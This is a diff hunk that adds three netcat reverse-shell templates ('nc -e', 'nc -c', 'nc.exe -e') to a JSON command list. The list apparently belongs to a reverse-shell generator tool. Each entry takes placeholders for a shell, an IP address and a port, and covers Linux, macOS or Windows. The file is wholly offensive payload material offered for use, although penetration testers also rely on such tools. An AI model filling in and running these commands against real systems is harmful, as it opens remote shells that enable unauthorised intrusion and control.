@@ -20,5 +20,37 @@
         "sub_components": [
             "IP", "PORT"
         ]
+    },
+    {
+        "name": "nc -e",
+        "command": "nc -e {SUBSHELL} {SUBIP} {SUBPORT}",
+        "os_support": [
+            "linux",
+            "mac"
+        ],
+        "sub_components": [
+            "IP", "PORT", "SHELL"
+        ]
+    },
+    {
+        "name": "nc -c",
+        "command": "nc -c {SUBSHELL} {SUBIP} {SUBPORT}",
+        "os_support": [
+            "linux",
+            "mac"
+        ],
+        "sub_components": [
+            "IP", "PORT", "SHELL"
+        ]
+    },
+    {
+        "name": "nc.exe -e",
+        "command": "nc.exe -e {SUBSHELL} {SUBIP} {SUBPORT}",
+        "os_support": [
+            "windows"
+        ],
+        "sub_components": [
+            "IP", "PORT", "SHELL"
+        ]
     }
 ]
